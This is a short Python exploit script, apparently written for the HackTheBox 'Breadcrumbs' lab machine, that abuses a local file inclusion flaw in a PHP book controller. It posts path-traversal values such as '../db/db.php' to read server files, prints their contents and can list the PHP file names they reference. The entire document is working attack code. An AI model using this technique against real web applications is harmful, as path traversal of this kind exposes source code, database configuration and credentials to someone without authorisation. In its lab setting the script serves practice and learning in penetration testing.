# This script is created to exploit the LFI vulnerability on the Breadcrumbs machine on HackTheBox
# Usage: python3 breadcrumbs_lfi.py ../db/db.php

import requests
import re
import sys

def lfi(page):
    data = {'book': page,
            'method': 1}
    resp = requests.post('http://10.10.10.228/includes/bookController.php',
                         data = data)
    try:
        return bytes(resp.text, 'utf-8').decode('unicode_escape').strip('"').replace('\/','/')
    except:
        return resp.text

if __name__ == "__main__":
    page = lfi(sys.argv[1])
    if len(sys.argv) == 3:
        files = re.findall(r'([a-zA-Z0-9\-\/]*\.php)', page)
        for f in files:
            print(f)
    else:
        print(page)
